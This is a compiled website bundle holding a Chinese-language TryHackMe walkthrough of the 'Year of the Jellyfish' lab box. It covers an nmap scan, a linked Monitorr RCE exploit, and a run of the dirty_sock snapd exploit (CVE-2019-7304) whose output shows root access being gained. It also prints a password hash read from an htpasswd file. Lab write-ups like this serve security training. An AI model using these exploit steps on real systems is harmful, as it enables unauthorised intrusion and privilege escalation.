"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[5733],{10795:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>l,frontMatter:()=>o,metadata:()=>a,toc:()=>h});var s=t(74848),i=t(28453);const o={sidebar_position:165,tags:["Easy","Linux","\u547d\u4ee4\u6267\u884c","SUID"],title:"Year of the Jellyfish",description:"Year of the Jellyfish",sidebar_label:"Year of the Jellyfish",slug:"/tryhackme/165"},r="Year of the Jellyfish",a={id:"box/TryHackMe/165",title:"Year of the Jellyfish",description:"Year of the Jellyfish",source:"@site/docs/box/TryHackMe/165.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/165",permalink:"/docs/tryhackme/165",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6267\u884c",permalink:"/docs/tags/\u547d\u4ee4\u6267\u884c"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:165,frontMatter:{sidebar_position:165,tags:["Easy","Linux","\u547d\u4ee4\u6267\u884c","SUID"],title:"Year of the Jellyfish",description:"Year of the Jellyfish",sidebar_label:"Year of the Jellyfish",slug:"/tryhackme/165"},sidebar:"boxSidebar",previous:{title:"Ra",permalink:"/docs/tryhackme/164"},next:{title:"Year of the Fox",permalink:"/docs/tryhackme/166"}},c={},h=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80/443",id:"80443",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; root",id:"www-data--root",level:3},{value:"Rabbit holes",id:"rabbit-holes",level:2},{value:"robyn",id:"robyn",level:3}];function p(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"year-of-the-jellyfish",children:"Year of the Jellyfish"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-201138.png",alt:"image-20240709201136220"})}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-126-21:~/yearofthejellyfish# nmap -sTCV -p 21,22,80,443,8000,896,22222 --min-rate 1000 3.250.181.103\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-22 08:23 BST\nNmap scan report for ec2-3-250-181-103.eu-west-1.compute.amazonaws.com (3.250.181.103)\nHost is up (0.00057s latency).\n\nPORT      STATE    SERVICE  VERSION\n21/tcp    open     ftp      vsftpd 3.0.3\n22/tcp    open     ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)\n80/tcp    open     http     Apache httpd 2.4.29\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Did not follow redirect to https://robyns-petshop.thm/\n443/tcp   open     ssl/http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Robyn&#039;s Pet Shop\n| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB\n| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm\n| Not valid before: 2023-10-22T07:12:22\n|_Not valid after:  2024-10-21T07:12:22\n|_ssl-date: TLS randomness does not represent time\n896/tcp   filtered unknown\n8000/tcp  open     http-alt\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Length: 15\n|_    Request\n22222/tcp open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA)\n|   256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA)\n|_  256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (EdDSA)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.60%I=7%D=10/22%Time=6534CDE1%P=x86_64-pc-linux-gnu%r(G\nSF:enericLines,3F,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Length:\\x\nSF:2015\\r\\n\\r\\n400\\x20Bad\\x20Request");\nService Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 45.94 seconds\n'})}),"\n",(0,s.jsx)(n.h2,{id:"80443",children:"80/443"}),"\n",(0,s.jsx)(n.p,{children:"\u4ece\u7aef\u53e3\u626b\u63cf\u7684\u7ed3\u679c\u4e2d\u6211\u53d1\u73b0\u4e86\u4ee5\u4e0b\u4e00\u4e9b\u57df\u4ee5\u53ca\u5b50\u57df:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"robyns-petshop.thm"}),"\n",(0,s.jsx)(n.li,{children:"monitorr.robyns-petshop.thm"}),"\n",(0,s.jsx)(n.li,{children:"beta.robyns-petshop.thm : \u4e00\u822c\u8fd9\u91cc\u4f1a\u51fa\u73b0\u6f0f\u6d1e\u4f46\u662f\u4ece\u626b\u63cf\u7ed3\u679c\u4e2d\u5e76\u6ca1\u6709\u83b7\u53d6\u5230\u4ec0\u4e48, \u56e0\u6b64\u4f30\u8ba1\u662f rabbit holes"}),"\n",(0,s.jsx)(n.li,{children:"dev.robyns-petshop.thm :"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e4b\u540e\u8fdb\u884c\u76ee\u5f55\u626b\u63cf, \u4e5f\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u65b0\u5947\u7684\u5185\u5bb9, \u5f53\u6211\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"monitorr.robyns-petshop.thm"}),"  \u5b50\u57df\u65f6\u53d1\u73b0\u5176\u6cc4\u9732\u4e86 CMS \u4ee5\u53ca\u7248\u672c\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684 EXP ",(0,s.jsx)(n.a,{href:"https://github.com/jayngng/monitorr-v1.7.6m-rce",children:"monitorr-v1.7.6m-rce"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-201207.png",alt:"image-20240709201205449"})}),"\n",(0,s.jsx)(n.p,{children:"\u4ece EXP \u4e2d\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u901a\u8fc7\u4e0a\u4f20\u4e00\u4e2a PHP \u4ee3\u7801\u8fdb\u884c\u7684 RCE \u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-201236.png",alt:"image-20240709201235238"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-201240.png",alt:"image-20240709201239118"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data--root",children:"www-data \u2014> root"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e4b\u540e\u6267\u884c ",(0,s.jsx)(n.a,{href:"http://linpeas.sh",children:"linpeas.sh"})," \u7a0b\u5e8f\u6211\u4eec\u53ef\u4ee5\u5728 SUID \u4e2d\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u7684\u5185\u5bb9"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-201249.png",alt:"image-20240709201247515"})}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u5bf9\u5e94\u7684 CVE \u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u901a\u8fc7\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684 SUDO \u7528\u6237\u7ec4\u7684\u7528\u6237\u6765\u5b8c\u6210\u63d0\u6743\u7684\u64cd\u4f5c"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://github.com/initstring/dirty_sock/tree/master",children:"GitHub - initstring/dirty_sock: Linux privilege escalation exploit via snapd (CVE-2019-7304)"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e0b\u8f7d\u5bf9\u5e94\u7684 EXP , \u5e76\u8fdb\u884c\u6267\u884c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6210\u529f\u6267\u884c\u4e86"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@petshop:/tmp$ python3 dirty_sockv2.py \n\n      ___  _ ____ ___ _   _     ____ ____ ____ _  _ \n      |  \\ | |__/  |   \\_/      [__  |  | |    |_/  \n      |__/ | |  \\  |    |   ___ ___] |__| |___ | \\_ \n                       (version 2)\n\n//=========[]==========================================\\\\\n|| R&D     || initstring (@init_string)                ||\n|| Source  || https://github.com/initstring/dirty_sock ||\n|| Details || https://initblog.com/2019/dirty-sock     ||\n\\\\=========[]==========================================//\n\n[+] Slipped dirty sock on random socket file: /tmp/rrttmlpmcv;uid=0;\n[+] Binding to socket file...\n[+] Connecting to snapd API...\n[+] Deleting trojan snap (and sleeping 5 seconds)...\n[+] Installing the trojan snap (and sleeping 8 seconds)...\n[+] Deleting trojan snap (and sleeping 5 seconds)...\n\n********************\nSuccess! You can now `su` to the following account and use sudo:\n   username: dirty_sock\n   password: dirty_sock\n********************\n\n(remote) www-data@petshop:/tmp$ su dirty_sock\nPassword: \nTo run a command as administrator (user "root"), use "sudo <command>".\nSee "man sudo_root" for details.\n\ndirty_sock@petshop:/tmp$ id\nuid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo)\ndirty_sock@petshop:/tmp$ sudo -l\n[sudo] password for dirty_sock: \nMatching Defaults entries for dirty_sock on petshop:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser dirty_sock may run the following commands on petshop:\n    (ALL : ALL) ALL\n    (ALL : ALL) ALL\ndirty_sock@petshop:/tmp$ sudo /bin/bash -p\nroot@petshop:/tmp# id\nuid=0(root) gid=0(root) groups=0(root)\n'})}),"\n",(0,s.jsx)(n.h2,{id:"rabbit-holes",children:"Rabbit holes"}),"\n",(0,s.jsx)(n.h3,{id:"robyn",children:"robyn"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u6267\u884c ",(0,s.jsx)(n.a,{href:"http://linpeas.sh",children:"linpeas.sh"})," \u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6 ",(0,s.jsx)(n.code,{children:"/etc/apache2/htpasswd"})," \u5176\u4e2d\u544a\u8bc9\u6211\u4eec\u7528\u6237 robyn \u7684 hash , \u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u89e3\u5bc6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@petshop:/tmp$ cat /etc/apache2/htpasswd \nrobyn:$apr1$tMFlj08b$5VCOhI2see0L0WRU8Mn.b.\n"})})]})}function l(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(p,{...e})}):p(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>a});var s=t(96540);const i={},o=s.createContext(i);function r(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);